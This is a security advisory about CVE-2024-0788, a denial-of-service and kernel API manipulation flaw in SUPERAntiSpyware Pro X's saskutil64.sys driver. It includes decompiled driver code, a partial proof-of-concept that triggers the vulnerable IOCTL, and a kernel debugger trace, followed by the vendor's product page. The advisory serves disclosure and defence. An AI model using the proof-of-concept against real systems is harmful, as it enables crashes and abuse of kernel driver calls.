=== Content from fluidattacks.com_069d1892_20250111_183916.html ===
[Contact us](/contact-us/)SearchEnglishEnglishEspaÃ±ol

* [![Fluid Attacks logo navbar](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/menu/Logo?_a=AXAJYUZ0.webp)](/)
ServicePlatform[Plans](/plans/)Resources[Advisories](/advisories/)Company[Log in](https://app.fluidattacks.com/)[Try for free](https://app.fluidattacks.com/SignUp)
# SUPERAntiSpyware Pro X - API manipulation

## Summary

|  |  |
| --- | --- |
| **Name** | SUPERAntiSpyware Pro X v10.0.1260 - Kernel-level API parameters manipulation |
| **Code name** | [Brubeck](https://en.wikipedia.org/wiki/Dave_Brubeck) |
| **Product** | SUPERAntiSpyware Pro X |
| **Vendor** | SUPERAntiSpyware |
| **Affected versions** | Version 10.0.1260 |
| **State** | Public |
| **Release date** | 2024-01-29 |

## Vulnerability

|  |  |
| --- | --- |
| **Kind** | Kernel-level API parameters manipulation |
| **Rule** | [344. Lack of data validation - Non Sanitized Variables](https://docs.fluidattacks.com/criteria/vulnerabilities/344/) |
| **Remote** | No |
| **CVSSv3 Vector** | CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:H |
| **CVSSv3 Base Score** | 5.8 |
| **Exploit available** | Yes |
| **CVE ID(s)** | [CVE-2024-0788](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-0788) |

## Description

SUPERAntiSpyware Pro X v10.0.1260 is vulnerable to
kernel-level API parameters manipulation and
Denial of Service vulnerabilities by triggering the
0x9C402140 IOCTL code of the saskutil64.sys
driver.

## Vulnerability

The 0x9C402140 IOCTL code of the saskutil64.sys
driver allows a local attacker to manipulate the
parameters of the `IoGetDeviceObjectPointer` and
`IoBuildSynchronousFsdRequest` kernel-level APIs,
leading to DoS when a invalid Device Object is
passed to `IoGetDeviceObjectPointer`. The primitive
can be further abused to create arbitrary IRPs to
perform driver-to-driver calls.

The decompiled pseudo-code of the affected function is
this:

```
__int64 __fastcall sub_1110C(__int64 a1, __int64 a2)
{
 unsigned __int64 v2; // rbx
 volatile void *v3; // rcx
 PIRP v4; // rax
 struct _UNICODE_STRING DestinationString; // [rsp+40h] [rbp-48h] BYREF
 struct _IO_STATUS_BLOCK IoStatusBlock; // [rsp+50h] [rbp-38h] BYREF
 struct _KEVENT Event; // [rsp+60h] [rbp-28h] BYREF
 PDEVICE_OBJECT DeviceObject; // [rsp+98h] [rbp+10h] BYREF
 union _LARGE_INTEGER Timeout; // [rsp+A0h] [rbp+18h] BYREF
 PFILE_OBJECT FileObject; // [rsp+A8h] [rbp+20h] BYREF

 v2 = *(_QWORD *)(a2 + 0x18);
 if ( v2 < 0x8000000000000000ui64 )
 {
 ProbeForRead((volatile void *)v2, 0x1018ui64, 1u);
 ProbeForWrite((volatile void *)v2, 0x1018ui64, 1u);
 }
 v3 = *(volatile void **)(v2 + 0x1010);
 if ( (unsigned __int64)v3 < 0x8000000000000000ui64 )
 {
 ProbeForRead(v3, *(unsigned int *)(v2 + 0x1008), 1u);
 ProbeForWrite(*(volatile void **)(v2 + 0x1010), *(unsigned int *)(v2 + 0x1008), 1u);
 }
 RtlInitUnicodeString(&DestinationString, (PCWSTR)v2);
 IoGetDeviceObjectPointer(&DestinationString, 0x80u, &FileObject, &DeviceObject); // [1]
 Timeout = *(union _LARGE_INTEGER *)(v2 + 0x1000);
 KeInitializeEvent(&Event, NotificationEvent, 0);
 v4 = IoBuildSynchronousFsdRequest( //[2]
 4u,
 DeviceObject,
 *(PVOID *)(v2 + 0x1010),
 *(_DWORD *)(v2 + 0x1008),
 &Timeout,
 &Event,
 &IoStatusBlock);
 v4->Flags = 0x10;
  if ( IofCallDriver(DeviceObject, v4) == 0x103 )
    KeWaitForSingleObject(&Event, Executive, 0, 0, 0i64);
  return 0i64;
}

```

When an attacker performs a request to the affected
IOCTL, some parameters of [1] and [2] can be influenced.

Snipped of the Proof-of-Concept:

```
ULONGLONG injectedBufferAddr = 0x00000003a0000000;
...
LPVOID injectedBuffer = VirtualAlloc((LPVOID)injectedBufferAddr, 0x1020, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
...
memset(injectedBuffer, 0x42, 0x1020);
...
// IoGetDeviceObjectPointer->ObjectName
swprintf_s((WCHAR*)inBuf, 13, L"\\Device\\CNG");
// IoBuildSynchronousFsdRequest->StartingOffset
((PDWORD64)((DWORD64)inBuf + 0x1000))[0] = (ULONGLONG)0x1337;
// IoBuildSynchronousFsdRequest->Length
((PDWORD64)((DWORD64)inBuf + 0x1008))[0] = (ULONGLONG)0x200;
// IoBuildSynchronousFsdRequest->Buffer
((PDWORD64)((DWORD64)inBuf + 0x1010))[0] = (ULONGLONG)injectedBuffer;
...
DWORD IoControlCode = 0x9C402140;
...
BOOL triggerIOCTL = DeviceIoControl(hOseeDriver, IoControlCode, (LPVOID)InputBuffer, InputBufferLength, (LPVOID)OutputBuffer, OutputBufferLength, &lpBytesReturned, NULL);

```

The resulting kernel-level API calls are:

```
Breakpoint 1 hit
SASKUTIL64+0x11b5:
fffff804`535211b5 ff157d0e0000 call qword ptr [SASKUTIL64+0x2038 (fffff804`53522038)]

1: kd> dps fffff804`53522038 L1
fffff804`53522038 fffff804`4e80f9f0 nt!IoGetDeviceObjectPointer

1: kd> du poi(rcx+8)
ffff8608`2b4bf000 "\Device\CNG"

Breakpoint 0 hit
SASKUTIL64+0x1216:
fffff804`53521216 ff15f40d0000 call qword ptr [SASKUTIL64+0x2010 (fffff804`53522010)]

0: kd> dps fffff804`53522010 L1
fffff804`53522010 fffff804`4e858f70 nt!IoBuildSynchronousFsdRequest

0: kd> r rcx; r rdx; r r8; r r9; dps poi(rsp+20) L1; dps poi(rsp+28) L1
rcx=0000000000000004
rdx=ffff860826932c90
r8=00000003a0000000
r9=0000000000000200
ffffa781`aa9e97e0  00000000`00001337
ffffa781`aa9e97a0  00000000`68060000

```
## Our security policy

We have reserved the ID CVE-2024-0788 to refer
to this issue from now on.

* <https://fluidattacks.com/advisories/policy/>

## System Information

* Version: SUPERAntiSpyware Pro X v10.0.1260
* Operating System: Windows

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by
[Andres Roldan](https://www.linkedin.com/in/andres-roldan/)
from Fluid Attacks' Offensive Team.

## References

**Vendor page** <https://www.superantispyware.com/>

**Product page** <https://www.superantispyware.com/professional-x-edition.html>

## Timeline

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2024-01-22

Vulnerability discovered.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2024-01-22

Vendor contacted.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2024-01-29

Public Disclosure.

[![Fluid Logo Footer](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/fluid-attacks-logo-2022-light?_a=AXAJYUZ0.webp)](/)

Hacking software for over 20 years

Fluid Attacks tests applications and other systems, covering all software development stages. Our team assists clients in quickly identifying and managing vulnerabilities to reduce the risk of incidents and deploy secure technology.

Service

[Continuous Hacking](/services/continuous-hacking/)[Platform overview](/platform/)

Solutions

[Application security](/solutions/)[Compliance](/compliance/)[Systems](/systems/)

Testing Techniques

[ASPM](/product/aspm/)[SAST](/product/sast/)[DAST](/product/dast/)[MPT](/product/mpt/)[MAST](/product/mast/)[SCA](/product/sca/)[CSPM](/product/cspm/)[PTaaS](/product/ptaas/)[RE](/product/re/)[SCR](/solutions/secure-code-review/)

Plans

[Essential](/plans/#essential)[Advanced](/plans/)

Resources

[Blog](/blog/)[Learn](/learn/)[Advisories](/advisories/)[Clients](/clients/)[Downloadables](/resources/)[Documentation](https://docs.fluidattacks.com/)

Company

[About us](/about-us/)[Certifications](/certifications/)[Partners](/partners/)[Careers](/careers/)[Contact us](/contact-us/)[Ethics Hotline](https://r.easyllama.com/ed68576b-c349-4f40-926b-4905c82c53bb)

Copyright Â© 0 Fluid Attacks. We hack your software. All rights reserved.

[Service status](https://status.fluidattacks.com/)[Terms of use](/terms-use/)[Privacy policy](/privacy/)[Cookie policy](/cookie/)



=== Content from www.superantispyware.com_f353c61b_20250111_183917.html ===


[New Professional X Edition: AI-powered detection engine with 1 billion+ threats blocked. Learn more.](/professional-x-edition.html "SUPERAntiSpyware Professional X Edition Update Available Now!")
 »

[![SUPERAntiSpyware Logo](/img/webp/logo.webp)](/ "SUPERAntiSpyware")

* 24/7 Customer Support **857-250-3224**
  Special offers when you call - Powered by USTechSupport

* Products
  + #### For Home
  + [Professional X Edition](/professional-x-edition.html)
  + #### For Business
  + [Corporate](/business.html)
  + [Academic & Non-Profit](/academic-non-profit.html)

  + [Technician Edition](/technician-edition.html)
* About
  + [Company](/company.html)
  + [Partners](https://info.iolo.com/partner-with-us)
  + [Solutions](/solutions/)
  + [Resources](/resources/)
  + [Blog](https://www.superantispyware.com/blog/)
  + [Research](/malware-research.html)
* Support
  + [FAQ](/support-faq.html)
  + [Technical Support](/technical-support.html)
  + [Contact](/contact.html)

* [Download](/downloadfile.html?productid=SUPERANTISPYWAREFREE "Download SUPERAntiSpyware")
* [Buy Pro X Edition](https://www.superantispyware.com/metrics.php?campaign=TOPBUYBUTTON&xappend=yes&event=DEFCLICK&target=https%3A%2F%2Fshop.superantispyware.com%2Fsas%2Fcarts%2F%3Fsc%3Dsas_ip_045 "Purchase SUPERAntiSpyware Professional X Edition")

Products

* [Home](/)
* [Professional X Edition](/professional-x-edition.html)

![laptop](images/webp/SAS-Laptop-Screens-03.webp)

![laptop](images/webp/SAS-Laptop-Screens-01.webp)

![laptop](images/webp/SAS-Laptop-Screens-02.webp)

# Professional X Edition

Protect your PC from malicious threats from [malware](/resources/what-is-malware.html "Malware"), spyware, ransomware, trojans, keyloggers, and more. Boost Microsoft Defender.

**Pro X Edition benefits: over 1 billion threats blocked, AI-powered detection engine, real-time threat blocking, automatic database updates, and scheduled scanning.**

![30 Day Money Back Guarantee](images/moneyback.jpg)
##### $19.99*1 PC / 1 Year*

* [Buy Pro X Edition](https://shop.superantispyware.com/sas/carts/?sc=sas_ip_050)
* [Download](downloadfile.html?productid=SUPERANTISPYWARE)

* [Definition Database: Core: 18522](definitions.html)
* [Trace: 16334](definitions.html)
* [SAS Version: 10.0.1270](producthistory.html?id=SUPERANTISPYWARE)

##### What It Does For You

* Detects & Removes 1 Billion+ Malicious Threats: Blocks Malware, Spyware, Adware, Trojans, Worms, Ransomware, Hijackers, Parasites, Rootkits, KeyLoggers, and many more.
* Securely Deletes Malicious Files: Quarantines potential threats and completely removes them, even the stubborn ones. Can restore quarantined items, if not harmful.
* Analyzes Your System In-Depth: System Investigator identifies spoofed and malicious files. Shows installed applications, browser plugins, and lets you track system changes over time.
* Cleans Up Browser Cookies & Popups:  Removes unwanted cookies. Stops ads with integrated SUPERAdBlocker Technology.

* Stops Ransomware In Its Tracks: Protects your files and prevents hackers from holding them hostage.
* Repairs PC Damage: Fixes parts of your operating system, registry, task manager, broken internet connections, etc. caused by malware.
* Complements Your PC: Lightweight program doesn't take up a lot of memory or processing power. Works with your antivirus and [driver updater software](https://www.getmydrivers.com/ "driver updater software").

* Easy to Use: Receive notifications when product and database updates are available. Scans run in the background and can start when your PC is sleeping.
* Stay informed: Review detailed scan logs about detected and removed threats and their locations.
* Get Support: Receive unlimited customer support via email and a 30-day unconditional, 100% Money-Back Guarantee.

##### How the PROFESSIONAL X EDITION Keeps You Secure 24/7

* Scans & Blocks Threats in Real-Time: Stops potentially harmful software from installing. Examines critical points of your system each time you start up or shut down. Get alerts when new programs are added.
* Updates Automatically: Never miss an update. Always have the latest database definitions so you have the most up-to-date protection.

* Enables Flexible Scanning Options: Schedule either quick, complete, or critical scans to fit your schedule.

* Sends Email Notifications: Get emails with scan results so you can monitor PCs remotely.

##### Advanced Detection & Removal

* AI-Powered Engine & Definitions DatabaseThe X Edition is upgraded with a robust detection engine fueled by 4th generation machine-learning AI. With over 500 million endpoints, the definitions database is constantly updated with the latest malware threats.

* Multi-Dimensional Scanning A next-generation scanning system that goes beyond the typical rules-based methods. It detects existing threats and analyzes general characteristics and code patterns to identify future threats.

* Process Interrogation TechnologyOur unique Process Interrogation Technology (PIT) detects hard-to-find threats like rootkits and kernel drivers, usually missed by standard anti-spyware applications.

##### System Requirements

* Windows® 7, Windows 8, Windows 8.1, Windows 10, Windows 11

### Stay in Control of Your PC

[Download](downloadfile.html?productid=SUPERANTISPYWARE)

* #### Products
* [Professional X Edition](/professional-x-edition.html "SUPERAntiSpyware Professional X Edition")
* ---
* [Corporate](/business.html "SUPERAntiSpyware Corporate Licensing")
* [Academic & Non-Profit](/academic-non-profit.html "SUPERAntiSpyware Academic and Non-Profit Licensing")
* [Technician Edition](/technician-edition.html "SUPERAntiSpyware Technician Edition")
* [Reseller](/reseller.html "SUPERAntiSpyware Reseller Program")

* #### Support
* [Frequently Asked Questions](/support-faq.html "SUPERAntiSpyware FAQ")
* [Contact Us](/contact.html "Contact SUPERAntiSpyware")
* [Product Uninstall](/supportfaqdisplay.html?faq=47 "Product Uninstall")

* #### About
* [Company](/company.html "SUPERAntiSpyware Company Information")
* [Partner with Us](https://info.iolo.com/partner-with-us "Partner with SUPERAntiSpyware")
* [Careers](https://www.linkedin.com/company/realdefenseglobal/jobs/ "SUPERAntiSpyware/RealDefense Jobs & Careers")
* [News](/media.html "SUPERAntiSpyware News and Press Releases")
* [Solutions](/solutions/ "SUPERAntiSpyware Solutions")
* [Resources](/resources/ "SUPERAntiSpyware Resources")
* [Blog](https://www.superantispyware.com/blog/ "SUPERAntiSpyware Blog")
* [Research](/malware-research.html "SUPERAntiSpyware Malware Research")
* [Sitemap](/sitemap.html "SUPERAntiSpyware Website Sitemap")

* #### Connect
* SUPERAntiSpyware

  c/o RealDefense

  150 S Los Robles Ave

  Suite 400

  Pasadena, CA 91101
* Customer Support

  857-250-3224

  24 hours a day, 7 days a week

* [![Facebook](/images/fb1.png)](https://www.facebook.com/SUPERAntiSpyware/ "SUPERAntiSpyware Facebook")
* [![X/Twitter](/images/tw1.png)](https://twitter.com/superantispy "SUPERAntiSpyware X/Twitter")

### Privacy Matters

#### SUPERAntiSpyware is committed to your privacy

We do not share or sell your data to third parties. We do use cookies and other third-party technologies to improve our site and services. The California Consumer Privacy Act (CCPA) gives you the ability to opt out of the use of cookies, third-party technologies and/or the future sale of your data. [Do not sell my personal information](https://app.enzuzo.com/policies/dsar/eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJDdXN0b21lcklEIjoyMjczOCwiQ3VzdG9tZXJOYW1lIjoiY3VzdC1sY0NZVXJnaSIsIkN1c3RvbWVyTG9nb1VSTCI6IiIsIlJvbGVzIjpbInJlZmVycmFsIl0sIlByb2R1Y3QiOiJlbnRlcnByaXNlIiwiaXNzIjoiRW56dXpvIEluYy4iLCJuYmYiOjE2ODc4MDUzNTF9.QppTjHrkCybJRkEfGL43vn6YrFfqw7xNdPv8bfFAkCI)
#### Details

Read our [Privacy Policy](https://www.realdefen.se/home/privacy-policy/) for a clear explanation of how we collect, use, disclose and store your information

Copyright © 2025 RealDefense LLC. All rights reserved.

* [Terms and Conditions](https://www.realdefen.se/home/terms-of-service/ "SUPERAntiSpyware Terms and Conditions")
* [| Privacy Policy](https://www.realdefen.se/home/privacy-policy/ "SUPERAntiSpyware Privacy Policy")


